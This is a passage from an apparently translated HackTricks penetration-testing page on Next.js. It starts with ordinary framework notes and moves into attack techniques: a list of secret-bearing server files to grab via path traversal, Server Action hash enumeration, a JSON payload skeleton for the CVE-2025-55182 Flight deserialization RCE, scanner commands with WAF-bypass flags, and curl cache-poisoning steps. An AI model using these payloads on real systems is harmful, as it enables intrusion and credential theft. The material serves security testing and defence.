**Doel:** Oorskryf die standaard Document, wat aanpassing van die `<html>` en `<body>` tags moontlik maak.

**Gebruikstoepassings:**

- Aanpassing van die `<html>` of `<body>` tags.
- Byvoeging van meta-tags of aangepaste skripte.
- Integrasie van lettertipes van derde partye.

**Voorbeeld:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Custom Server (Opsioneel)

**Purpose:** Alhoewel Next.js met 'n ingeboude server kom, kan jy 'n aangepaste server skep vir gevorderde gebruiksgevalle soos aangepaste routing of integrasie met bestaande backend-dienste.

**Note:** Die gebruik van 'n aangepaste server kan ontplooiingsopsies beperk, veral op platforms soos Vercel wat geoptimaliseer is vir Next.js se ingeboude server.

**Voorbeeld:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Aanvullende argitektuur- en sekuriteits-oorwegings

### Omgewingsveranderlikes en konfigurasie

**Doel:** Bestuur sensitiewe inligting en konfigurasie-instellings buite die codebasis.

**Beste praktyke:**

- **Gebruik `.env`-lêers:** Stoor veranderlikes soos API keys in `.env.local` (uitgesluit van weergawebeheer).
- **Toegang tot veranderlikes veilig:** Gebruik `process.env.VARIABLE_NAME` om omgewingsveranderlikes te kry.
- **Moet geheime nooit aan die kliënt openbaar nie:** Verseker dat sensitiewe veranderlikes slegs aan die bedienerkant gebruik word.

**Voorbeeld:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Let wel:** Om veranderlikes slegs op die server te beperk, skrap hulle uit die `env`-objek of plaas die voorvoegsel `NEXT_PUBLIC_` om kliënt-eksponering toe te laat.

### Nuttige server-artifakte om te teiken via LFI/download endpunte

As jy 'n path traversal of download API in 'n Next.js-app vind, teiken saamgestelde artefakte wat server-side geheime en auth-logika leak:

- `.env` / `.env.local` vir sessie-geheime en verskaffer-credentials.
- `.next/routes-manifest.json` en `.next/build-manifest.json` vir 'n volledige roetelijst.
- `.next/server/pages/api/auth/[...nextauth].js` om die saamgestelde NextAuth-configuratie te herkry (bevat dikwels fallback-wagwoorde wanneer `process.env`-waardes nie gestel is nie).
- `next.config.js` / `next.config.mjs` om rewrites, redirects en middleware-routing na te gaan.

### Verifikasie en magtiging

**Benadering:**

- **Sessie-gebaseerde verifikasie:** Gebruik cookies om gebruikersessies te bestuur.
- **Token-gebaseerde verifikasie:** Implementeer JWTs vir stateless-verifikasie.
- **Derdeparty-providers:** Integreer met OAuth-providers (bv. Google, GitHub) deur biblioteke soos `next-auth` te gebruik.

**Sekerheidspraktyke:**

- **Veilige cookies:** Stel `HttpOnly`, `Secure`, en `SameSite` attributte.
- **Wagwoord-hashing:** Hash altyd wagwoorde voordat jy dit stoor.
- **Invoervalidasie:** Voorkom injection attacks deur insette te valideer en te sanitiseer.

**Voorbeeld:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Prestasie-optimalisering

**Strategieë:**

- **Beeldoptimalisering:** Gebruik Next.js se `next/image` komponent vir outomatiese beeldoptimalisering.
- **Kode-splitsing:** Gebruik dinamiese imports om kode te splits en die aanvanklike laaitye te verminder.
- **Kasbestuur:** Implementeer kasstrategieë vir API-antwoorde en statiese hulpbronne.
- **Luie laai:** Laai komponente of hulpbronne slegs wanneer hulle nodig is.

**Voorbeeld:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Moderne Next.js gebruik "Server Actions" wat op die server uitgevoer word, maar vanaf die client aangeroep word. In produksie is hierdie aanroepe ondoorgrondelik: alle POSTs land by 'n gemeenskaplike endpoint en word onderskei deur 'n build-spesifieke hash wat in die `Next-Action` header gestuur word. Voorbeeld:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Wanneer `productionBrowserSourceMaps` geaktiveer is, bevat minified JS chunks oproepe na `createServerReference(...)` wat genoeg struktuur leak (plus geassosieerde source maps) om 'n mapping tussen die action hash en die oorspronklike functienaam te herstel. Dit laat jou toe om hashes waargeneem in `Next-Action` te vertaal na konkrete teikens soos `deleteUserAccount()` of `exportFinancialData()`.

### Uittrekkingsbenadering (regex op minified JS + opsionele source maps)

Soek afgelaaide JS chunks vir `createServerReference` en onttrek die hash en die function/source symbol. Twee nuttige patrone:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Groep 1: server action hash (40+ hex chars)
- Groep 2: simbool of pad wat via die source map na die oorspronklike funksie opgelos kan word wanneer dit teenwoordig is

As die script 'n source map adverteer (trailer comment `//# sourceMappingURL=<...>.map`), haal dit af en los die simbool/pad op na die oorspronklike funksienaam.

### Praktiese werkstroom

- Passiewe ontdekking terwyl jy blaai: vang requests met `Next-Action` headers en JS chunk URLs.
- Haal die verwysde JS bundles en die gepaardgaande `*.map` lêers af (wanneer teenwoordig).
- Voer die regex hierbo uit om 'n hash↔name-woordeboek te bou.
- Gebruik die woordeboek om teiken-toetsing:
- Naam-gedrewe triage (bv., `transferFunds`, `exportFinancialData`).
- Moniteer dekking oor builds volgens funksienaam (hashes roteer oor builds).

### Oefen verborge aksies (template-gebaseerde versoek)

Neem 'n geldige POST wat in-proxy waargeneem is as 'n sjabloon en ruil die `Next-Action` waarde om 'n ander ontdekte aksie te teiken:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Speel dit in Repeater af en toets authorization, input validation en business logic van andersins onbereikbare actions.

### Burp-automatisering

- NextjsServerActionAnalyzer (Burp extension) automatiseer bogenoemde in Burp:
- Deursoek proxy-geskiedenis na JS-chunks, onttrek `createServerReference(...)` inskrywings, en ontleed source maps wanneer beskikbaar.
- Onderhou 'n deursoekbare hash↔function-name woordeboek en verwyder duplikate oor builds op basis van function name.
- Kan 'n geldige template POST opspoor en 'n gereed-om-te-stuur Repeater-tab oopmaak met die teiken action se hash vervang.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Aantekeninge en beperkings

- Vereis dat `productionBrowserSourceMaps` in production aangeskakel is om name uit bundles/source maps te herstel.
- Function-name disclosure is nie op sigself 'n vulnerability nie; gebruik dit om ontdekking te lei en om elke action se authorization te toets.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments that expose Server Actions on `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** bevat 'n kritieke server-side prototype pollution tydens **Flight** chunk deserialisasie. Deur `$` verwysings binne 'n Flight payload te vervaardig kan 'n aanvaller van besoedelde prototypes na arbitrêre JavaScript-uitvoering en daarna na OS-opdrag-uitvoering binne die Node.js-proses skuif.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Aanvalketting in Flight-chunks

1. **Prototype pollution primitive:** Stel `"then": "$1:__proto__:then"` sodat die resolver 'n `then` funksie op `Object.prototype` skryf. Enige gewone object wat daarna verwerk word, word 'n thenable, wat die aanvaller toelaat om async control flow binne RSC-internals te beïnvloed.
2. **Rebinding to the global `Function` constructor:** Rig `_response._formData.get` na `"$1:constructor:constructor"`. Tydens resolusie, `object.constructor` → `Object`, en `Object.constructor` → `Function`, sodat toekomstige oproepe na `_formData.get()` eintlik `Function(...)` uitvoer.
3. **Code execution via `_prefix`:** Plaas JavaScript-bron in `_response._prefix`. Wanneer die besoedelde `_formData.get` aangeroep word, evalueer die raamwerk `Function(_prefix)(...)`, sodat die geïnjekteerde JS `require('child_process').exec()` of enige ander Node-primitive kan uitvoer.

#### Payload skelet
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Kaart van blootstelling van React Server Functions

React Server Functions (RSF) is enige funksies wat die `'use server';` direktief bevat. Elke form action, mutation, of fetch helper wat aan een van daardie funksies gebind is, word 'n RSC Flight endpoint wat gemaklik attacker-supplied payloads deserialiseer. Nuttige recon-stappe wat uit React2Shell assessments afgelei is:

- **Static inventory:** kyk vir die direktief om te verstaan hoeveel RSFs deur die framework outomaties blootgestel word.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` skakel die App Router + `app/` directory standaard aan, wat stilweg elke route in 'n RSC-capable endpoint omskakel. App Router assets soos `/_next/static/chunks/app/` of responses wat Flight chunks oor `text/x-component` stroom, is sterk internet-facing fingerprints.
- **Implicitly vulnerable RSC deployments:** React se eie advisory merk op dat apps wat die RSC runtime insluit exploiteerbaar kan wees **selfs sonder eksplisiete RSFs**, so beskou enige build wat `react-server-dom-*` 19.0.0–19.2.0 gebruik as verdag.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. hergebruik dieselfde serializer en erf dieselfde remote attack surface totdat hulle gepatchte React builds insluit.

#### Weergawe-dekking (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **kwetsbaar** in 19.0.0, 19.1.0–19.1.1 en 19.2.0; **gepatch** in 19.0.1, 19.1.2 en 19.2.1 onderskeidelik.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 bevat die kwetsbare RSC-stapel. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 sluit gefixeerde deps in, so enige build onder daardie weergawes is van hoë waarde.
- **Next.js canary:** `14.3.0-canary.77+` lewer ook die buggy runtime en het tans geen gepatchte canary drops nie, wat daardie fingerprints sterk exploitation-kandidate maak.

#### Afstandsopsporingsorakel

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) stuur 'n opgemaakte multipart Flight-versoek na kandidaatpaaie en monitor die bedienerkantgedrag:

- **Default mode** voer 'n deterministiese RCE payload uit (wiskunde-operasie weerspieël via `X-Action-Redirect`) wat code-uitvoering bewys.
- **`--safe-check` mode** vervorm die Flight-boodskap doelbewus sodat gepatchte servers `200/400` teruggee, terwyl kwesbare teikens `HTTP/500` antwoorde uitspuug wat die `E{"digest"` substring in die liggaam bevat. Daardie `(500 + digest)` paar is tans die mees betroubare remote-orakel wat deur verdedigers gepubliseer is.
- Ingeboude `--waf-bypass`, `--vercel-waf-bypass`, en `--windows` skakelaars pas payload layout aan, voeg rommel vooraan of ruil OS-opdragte sodat jy werklike Internet assets kan probeer.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Ander onlangse App Router-probleme (laat 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – verkeerd gevormde Flight-payloads kan die RSC-resolver in 'n oneindige lus laat draai (pre-auth DoS) of die serialisering van saamgestelde Server Function-kode vir ander aksies afdwing. App Router builds ≥13.3 word geraak totdat dit gepatch is; 15.0.x–16.0.x benodig die spesifieke patch-lyne uit die upstream advisory. Hergebruik die normale Server Action-pad maar stroom 'n `text/x-component` body met misbruikende `$`-verwysings. Agter 'n CDN bly die vasgehangde konneksie oop danksy cache-timeouts, wat die DoS goedkoop maak.
- **Triage tip:** Ongepatchte teikens stuur `500` terug met `E{"digest"` na verkeerd gevormde Flight-payloads; gepatchte builds stuur `400/200` terug. Toets enige endpoint wat reeds Flight-chunks stroom (kyk vir `Next-Action` headers of `text/x-component` responses) en herhaal met 'n gemodifiseerde payload.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – ontbrekende `Vary` laat 'n `Accept: text/x-component` response in die cache beland en aan browsers wat HTML verwag bedien word. 'n Enkele priming-aanvraag kan die bladsy met rou RSC-payloads vervang. PoC-vloei:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
If the second response returns JSON Flight data instead of HTML, the route is poisonable. Maak die cache skoon na toetsing.

## References

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
